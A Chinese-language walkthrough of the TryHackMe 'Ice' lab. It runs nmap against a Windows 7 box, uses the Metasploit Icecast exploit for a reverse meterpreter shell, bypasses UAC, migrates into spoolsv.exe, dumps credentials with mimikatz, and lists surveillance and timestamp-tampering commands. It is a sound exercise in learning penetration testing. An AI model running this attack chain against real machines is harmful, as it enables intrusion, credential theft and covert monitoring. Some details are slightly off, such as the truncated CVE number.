# Ice Writeup
> URL: https://tryhackme.com/room/ice

## Recon 
- 題目建議使用 SYN Scan
	- https://nmap.org/book/synscan.html
	- 可以發現指令是 `-sS`
	- `sudo nmap -sS 10.10.209.59 `
		- 需要 root 權限 所以 sudo
	-	```
		└─$ sudo nmap -sS 10.10.209.59
		[sudo] password for kali: 
		Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-31 08:58 EDT
		Nmap scan report for 10.10.209.59
		Host is up (0.27s latency).
		Not shown: 988 closed ports
		PORT      STATE SERVICE
		135/tcp   open  msrpc
		139/tcp   open  netbios-ssn
		445/tcp   open  microsoft-ds
		3389/tcp  open  ms-wbt-server
		5357/tcp  open  wsdapi
		8000/tcp  open  http-alt
		49152/tcp open  unknown
		49153/tcp open  unknown
		49154/tcp open  unknown
		49158/tcp open  unknown
		49159/tcp open  unknown
		49160/tcp open  unknown
		```
- 不管，還是run一次習慣的 `-A` 看看
	```
	sudo nmap -A 10.10.209.59
	Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-31 09:00 EDT
	Stats: 0:01:24 elapsed; 0 hosts completed (1 up), 1 undergoing Traceroute
	Traceroute Timing: About 32.26% done; ETC: 09:02 (0:00:00 remaining)
	Nmap scan report for 10.10.209.59
	Host is up (0.28s latency).
	Not shown: 988 closed ports
	PORT      STATE SERVICE      VERSION
	135/tcp   open  msrpc        Microsoft Windows RPC
	139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
	445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
	3389/tcp  open  tcpwrapped
	| ssl-cert: Subject: commonName=Dark-PC
	| Not valid before: 2021-07-30T12:49:58
	|_Not valid after:  2022-01-29T12:49:58
	|_ssl-date: 2021-07-31T13:02:27+00:00; 0s from scanner time.
	5357/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
	|_http-server-header: Microsoft-HTTPAPI/2.0
	|_http-title: Service Unavailable
	8000/tcp  open  http         Icecast streaming media server
	|_http-title: Site doesn't have a title (text/html).
	49152/tcp open  msrpc        Microsoft Windows RPC
	49153/tcp open  msrpc        Microsoft Windows RPC
	49154/tcp open  msrpc        Microsoft Windows RPC
	49158/tcp open  msrpc        Microsoft Windows RPC
	49159/tcp open  msrpc        Microsoft Windows RPC
	49160/tcp open  msrpc        Microsoft Windows RPC
	No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
	TCP/IP fingerprint:
	OS:SCAN(V=7.91%E=4%D=7/31%OT=135%CT=1%CU=30419%PV=Y%DS=4%DC=T%G=Y%TM=610549
	OS:E3%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10D%TI=I%CI=I%II=I%SS=S%TS
	OS:=7)OPS(O1=M506NW8ST11%O2=M506NW8ST11%O3=M506NW8NNT11%O4=M506NW8ST11%O5=M
	OS:506NW8ST11%O6=M506ST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=20
	OS:00)ECN(R=Y%DF=Y%T=80%W=2000%O=M506NW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=
	OS:S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y
	OS:%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD
	OS:=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0
	OS:%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1
	OS:(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI
	OS:=N%T=80%CD=Z)

	Network Distance: 4 hops
	Service Info: Host: DARK-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

	Host script results:
	|_clock-skew: mean: 1h15m00s, deviation: 2h30m00s, median: 0s
	|_nbstat: NetBIOS name: DARK-PC, NetBIOS user: <unknown>, NetBIOS MAC: 02:bd:72:1c:16:7b (unknown)
	| smb-os-discovery: 
	|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
	|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
	|   Computer name: Dark-PC
	|   NetBIOS computer name: DARK-PC\x00
	|   Workgroup: WORKGROUP\x00
	|_  System time: 2021-07-31T08:02:13-05:00
	| smb-security-mode: 
	|   account_used: guest
	|   authentication_level: user
	|   challenge_response: supported
	|_  message_signing: disabled (dangerous, but default)
	| smb2-security-mode: 
	|   2.02: 
	|_    Message signing enabled but not required
	| smb2-time: 
	|   date: 2021-07-31T13:02:13
	|_  start_date: 2021-07-31T12:49:56

	TRACEROUTE (using port 110/tcp)
	HOP RTT       ADDRESS
	1   139.52 ms 10.13.0.1
	2   ... 3
	4   283.86 ms 10.10.209.59

	OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
	Nmap done: 1 IP address (1 host up) scanned in 104.04 seconds
	```



- Once the scan completes, we'll see a number of interesting ports open on this machine. As you might have guessed, the firewall has been disabled (with the service completely shutdown), leaving very little to protect this machine. One of the more interesting ports that is open is Microsoft Remote Desktop (MSRDP). What port is this open on?
	- 一堆字，題目不會講重點ㄇ...他問 RDP 是什麼 Port
	- `3389`


- What service did nmap identify as running on port 8000? (First word of this service)
	- 用 `-A` 的 nmap 可以看出
	- 他是 `Icecast`


- What does Nmap identify as the hostname of the machine? (All caps for the answer)
	- 一樣是 `-A` 的 nmap 有寫到 `Host:`
	- `DARK-PC`


## Gain Access 

- Now that we've identified some interesting services running on our target machine, let's do a little bit of research into one of the weirder services identified: Icecast. Icecast, or well at least this version running on our target, is heavily flawed and has a high level vulnerability with a score of 7.5 (7.4 depending on where you view it). What type of vulnerability is it? Use https://www.cvedetails.com for this question and the next.
	- 我們知道他是 `Icecast` 就可以找到他的弱點
	- 不過我是直接 Google `Icecast RCE`
		- ~~我覺得 cvedetails 的搜尋很難用~~
	- https://www.cvedetails.com/cve/CVE-2004-1561/
	- 題目問說 Type
		- ![](https://i.imgur.com/SmZtXs1.png)
	- 所以是 `Execute Code Overflow`

- What is the CVE number for this vulnerability? This will be in the format: CVE-0000-0000
	- `CVE-2004-156`
- After Metasploit has started, let's search for our target exploit using the command 'search icecast'. What is the full path (starting with exploit) for the exploitation module? This module is also referenced in 'RP: Metasploit' which is recommended to be completed prior to this room, although not entirely necessary. 
	- 開啟 msf
		- `msfconsole`
	- 輸入 `search icecast` 尋找 icecast 相關攻擊 module
		- ![](https://i.imgur.com/JahaOFV.png)
	- 可以找到 module 為
		- `exploit/windows/http/icecast_header`
- 準備 Exploit
	- 輸入 `use 0` 或 `use exploit/windows/http/icecast_header`
	- 輸入 `show options`
	- ![](https://i.imgur.com/ebWMHSw.png)
	- 可以看到我們需要輸入的參數
		- RHOSTS
		- LHOST
	- `set RHOSTS 10.10.209.59`
	- `set LHOSTS 10.13.21.55`
	- 輸入 `exploit`
## Escalate 
- Woohoo! We've gained a foothold into our victim machine! What's the name of the shell we have now?
	- ![](https://i.imgur.com/In1AKy0.png)
	- 他自動彈回了一個 `meterpreter` 的 shell
-  What user was running that Icecast process? The commands used in this question and the next few are taken directly from the 'RP: Metasploit' room. 
	-  輸入 `ps` 可以看到所有的 process
	- ![](https://i.imgur.com/d4jMJL3.png)
	-  而如上圖，`Icecast2.exe` 使用者為 `DARK`
- What build of Windows is the system?
	- 偵察系統版本有助於後續的工作
	- 可以輸入 `sysinfo` 觀察
	- ![](https://i.imgur.com/PIFkh0P.png)
	- `7601`
- Now that we know some of the finer details of the system we are working with, let's start escalating our privileges. First, what is the architecture of the process we're running?
	- 如上的 `sysinfo` ，可以看到架構是 `x64`

- Now that we know the architecture of the process, let's perform some further recon. While this doesn't work the best on x64 machines, let's now run the following command `run post/multi/recon/local_exploit_suggester`. *This can appear to hang as it tests exploits and might take several minutes to complete*
	- 接下來我們要使用 meterpreter 的自動 exploit 推薦器來做自動化測試
	- `run post/multi/recon/local_exploit_suggester`
	- ![](https://i.imgur.com/ROwgkuO.png)
- Running the local exploit suggester will return quite a few results for potential escalation exploits. What is the full path (starting with exploit/) for the first returned exploit?
	- 第一個回傳的是 `exploit/windows/local/bypassuac_eventvwr`

- 按下鍵盤 `ctrl + z` 先把 meterpreter session 丟去背景
	- 準備來下 explit 指令
	- 輸入 `use exploit/windows/local/bypassuac_eventvwr`
		- ![](https://i.imgur.com/butocXi.png)
	- 輸入 `show options`
		- ![](https://i.imgur.com/8NpF3XG.png)
	- 確認目前的 session ID
		- ![](https://i.imgur.com/yeRDm2Y.png)
		- ID 為 `1`
	- 設定相關參數
		- `set session 1`
		- `set LHOSTS 10.13.21.55`
	- 輸入 `run` 開始執行
		- ![](https://i.imgur.com/rCkmQoo.png)
- We can now verify that we have expanded permissions using the command `getprivs`. What permission listed allows us to take ownership of files?
	- 輸入 `getprivs` 可以看到我們的權限
	- ![](https://i.imgur.com/xFxCjcl.png)
	- 他說要可以 take ownership of files
	- 所以是 `SeTakeOwnershipPrivilege`
## Looting
- Mentioned within this question is the term 'living in' a process. Often when we take over a running program we ultimately load another shared library into the program (a dll) which includes our malicious code. From this, we can spawn a new thread that hosts our shell. 
	- 他說要找印表機相關的程式 
	- 先下 `ps` 觀察 processes
		- ![](https://i.imgur.com/yfRB3fr.png)
	- 透過 Google 可以發現是 `spoolsv.exe`
		- 他的 pid 是 `1300`
	- ![](https://i.imgur.com/1X7x918.png)
- 輸入 `getuid` 觀察目前我們是什麼使用者
	- ![](https://i.imgur.com/h7Qlwg7.png)
- 輸入 migrate `1300`
	- 把自己的 process 搬移到 pid `1300` 上面
	- ![](https://i.imgur.com/xGFilxI.png)
- Let's check what user we are now with the command `getuid`. What user is listed?
	- 再輸入一次 `getuid`
	- ![](https://i.imgur.com/n76S9D9.png)
	- 會發現我們變成 `NT AUTHORITY\SYSTEM` 權限!
- 輸入 `load kiwi` 載入 mimikatz
	- ![](https://i.imgur.com/PosfjpO.png)
- 輸入 `help` 觀察 `mimikatz` 使用方法
	- ![](https://i.imgur.com/oUDlEAd.png)

- Which command allows up to retrieve all credentials?
	- `creds_all`
	- ![](https://i.imgur.com/6hVvHWN.png)
- Run this command now. What is Dark's password? Mimikatz allows us to steal this password out of memory even without the user 'Dark' logged in as there is a scheduled task that runs the Icecast as the user 'Dark'. It also helps that Windows Defender isn't running on the box ;) (Take a look again at the ps list, this box isn't in the best shape with both the firewall and defender disabled)
	- 上面就有寫到 `Dark` 的密碼為 `Password01!`
## Post-Exploitation 
- What command allows us to dump all of the password hashes stored on the system? We won't crack the Administrative password in this case as it's pretty strong (this is intentional to avoid password spraying attempts)
	- 輸入 `hashdump` 可以 dump 出所有的密碼 hash
	- ![](https://i.imgur.com/XUEXCuv.png)
	- 其實我們在這邊也可以複製 Dark 的 hash 然後用 John 爆爆看
		- `john hash.txt --wordlist=/opt/rockyou.txt --format=NT`
		- ![](https://i.imgur.com/CPtjE1t.png)
		- 可以發現也是可以快速爆出密碼
- While more useful when interacting with a machine being used, what command allows us to watch the remote user's desktop in real time?
	- 這題剛開始我以為是說螢幕截圖 `screenshot`
		- ![](https://i.imgur.com/LFC3mFD.png)
		- 輸入完之後會自動的存一張即時的圖檔
		- ![](https://i.imgur.com/V1k9CCb.png)
	- 不過後來發現他要是 `real time`，所以答案是 `screenshare`
		- ![](https://i.imgur.com/fHJDX5V.png)
		- 他會開一個 html 然後自動刷新、可以即時監看
		- ![](https://i.imgur.com/h18QsIa.png)
-  How about if we wanted to record from a microphone attached to the system? 
	-  監聽麥克風可以使用 `record_mic`
-  To complicate forensics efforts we can modify timestamps of files on the system. What command allows us to do this? Don't ever do this on a pentest unless you're explicitly allowed to do so! This is not beneficial to the defending team as they try to breakdown the events of the pentest after the fact.
	-  竄改 timestamp 可以用 `timestomp`
- Mimikatz allows us to create what's called a `golden ticket`, allowing us to authenticate anywhere with ease. What command allows us to do this?
	- `golden_ticket_create`
- 可以透過 `run post/windows/manage/enable_rdp` 開啟RDP
